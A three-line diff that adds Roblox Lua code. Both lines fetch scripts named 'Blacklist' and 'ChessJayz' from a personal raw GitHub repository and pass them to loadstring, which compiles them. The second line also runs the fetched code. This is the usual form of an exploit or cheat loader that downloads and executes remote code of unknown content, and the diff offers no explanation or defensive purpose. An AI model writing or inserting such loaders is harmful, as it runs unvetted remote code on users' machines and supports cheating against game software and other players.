@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ejayheretape/Script/refs/heads/main/Blacklist"))
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ejayheretape/Script/refs/heads/main/ChessJayz"))()
